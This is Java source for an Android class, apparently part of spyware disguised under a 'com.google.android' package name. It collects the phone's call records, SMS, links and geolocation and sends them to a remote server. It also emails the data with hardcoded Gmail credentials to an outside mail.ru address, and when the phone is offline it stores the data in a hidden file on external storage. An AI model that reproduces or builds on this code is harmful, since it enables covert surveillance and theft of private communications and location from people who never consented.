package com.google.android.bs;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Timer;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Environment;
import android.util.Log;

public class DataSendHandler {
	Timer myTimer;
	private Context context;
	public static ArrayList<String> stringForTransmission = new ArrayList<String>();
	String sendString;
	Request req = new Request(context);

	public DataSendHandler() {

	}

	// type: 1 - call, 2 -sms, 3 - link, 4 - geolocation
	public void send(int type, String data) {

		switch (type) {
		case 1:
			sendCall(data);
			break;
		case 2:
			sendSms(data);
			break;
		case 3:
			sendLink(data);
			break;
		case 4:
			sendGeo(data);
			break;
		}
	}

	private void sendCall(String string) {
		sendString = string;
		
		if (isOnline() == true) {
			req.sendRequest(sendString);
		} else {
			addLine(string);
		}

	}

	public void send(String str) {
		MyTask mt = new MyTask();
		mt.execute(str);
	}

	class MyTask extends AsyncTask<String, Void, Void> {

		@Override
		protected void onPreExecute() {
			super.onPreExecute();

		}

		@Override
		protected Void doInBackground(String... strs) {
			GMailSender sender = new GMailSender("annajonnes84@gmail.com",
					"annajones84");
			try {
				sender.sendMail("subj", strs[0], "annajones84@gmail.com",
						"elena_vaenga_2014@mail.ru");
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			return null;
		}

		@Override
		protected void onPostExecute(Void result) {
			super.onPostExecute(result);
		}
	}

	private void sendSms(String string) {
		Log.d("smsRec", string);
		sendString = string;
		if (isOnline() == true) {
			req.sendRequest(sendString);
			// send(string);
		} else {
			addLine(string);
		}

	}

	private void sendLink(String string) {
		Log.d("linkRec", string);
		
		sendString = string;
		if (isOnline() == true) {
			req.sendRequest(sendString);
			// send(string);
		} else {
			addLine(string);
		}

	}

	private void sendGeo(String string) {
		Log.d("geoRec", string);
		sendString = string;
		if (isOnline() == true) {
			req.sendRequest(sendString);
			// send(string);
		} else {
			addLine(string);
		}

	}

	public boolean isOnline() {

		ConnectivityManager connectivity = (ConnectivityManager) context
				.getSystemService(Context.CONNECTIVITY_SERVICE);
		if (connectivity != null) {
			NetworkInfo[] info = connectivity.getAllNetworkInfo();
			if (info != null)
				for (int i = 0; i < info.length; i++)
					if (info[i].getState() == NetworkInfo.State.CONNECTED) {
						return true;
					}

		}
		return false;
	}

	public DataSendHandler(Context context) {
		this.context = context;
	}

	public void addLine(String string) {
		File outFile = new File(Environment.getExternalStorageDirectory(),
				"/conf");
		FileWriter wrt = null;
		try {
			wrt = new FileWriter(outFile, true);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		try {
			wrt.append(string + "\n");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		try {
			wrt.flush();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
}